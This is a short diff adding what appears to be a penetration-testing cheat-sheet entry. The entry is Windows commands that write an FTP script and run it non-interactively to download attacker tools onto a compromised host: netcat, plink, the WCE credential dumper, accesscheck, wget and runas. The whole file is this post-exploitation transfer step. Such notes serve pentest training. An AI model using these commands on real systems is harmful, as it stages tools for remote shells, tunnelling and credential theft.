@@ -1,0 +1,13 @@
+FTP :
+
+echo USER offsec>> ftp.txt 
+echo ftp>> ftp.txt 
+echo bin >> ftp.txt 
+echo GET nc.exe >> ftp.txt 
+echo GET plink.exe >> ftp.txt 
+echo GET wce.exe >> ftp.txt 
+echo GET accesscheck.exe >> ftp.txt 
+echo GET wget.exe >> ftp.txt 
+echo GET runas.exe >> ftp.txt 
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
